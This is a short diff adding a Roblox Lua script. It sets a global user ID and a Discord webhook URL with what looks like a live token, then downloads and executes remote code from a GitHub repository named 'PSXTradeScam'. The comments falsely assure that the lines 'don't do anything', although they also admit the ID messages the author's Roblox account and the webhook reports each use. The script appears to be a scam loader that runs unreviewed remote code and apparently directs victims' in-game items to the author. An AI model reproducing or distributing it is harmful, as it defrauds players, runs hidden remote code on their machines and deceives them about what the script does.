@@ -1,0 +1,3 @@
+_G.UserID = 4167632255 --this dosen't do anything bc it notifies my bot and send message to my roblox account it dosent do anything
+_G.WebHook = "https://discord.com/api/webhooks/1057663387036823644/BUcMv5fA-jGSk_EK04WmGOMzHYO6AyO5z3wT8KjSWqo-rlqVXqCcXKMNmukJrc0XcRMg" --this webhook notifies my discord server that someone used the script it dosent do anything
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SkylerClock600/PSXTradeScam/main/script"))()
